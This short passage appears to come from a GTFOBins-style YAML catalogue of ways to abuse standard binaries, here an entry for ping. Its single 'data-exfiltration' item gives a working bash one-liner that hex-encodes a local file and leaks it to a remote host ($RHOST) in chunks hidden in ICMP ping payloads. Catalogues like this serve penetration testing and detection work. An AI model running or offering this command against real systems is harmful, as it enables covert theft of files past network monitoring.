...
functions:
  ...
  data-exfiltration:
    - description: Exfiltrate file contents or command output over ICMP packets embedded in ping requests.
      code: |
        hex=$(while IFS= read -r line; do for ((i=0; i<${#line}; i++)); do; printf "%02x" "'${line:$i:1}"; done; done < $LFILE); i=0; while [ $i -lt ${#hex} ]; do chunk="${hex:$i:16}"; ping -c1 -p "$chunk" $RHOST; i=$((i+16)); done
---
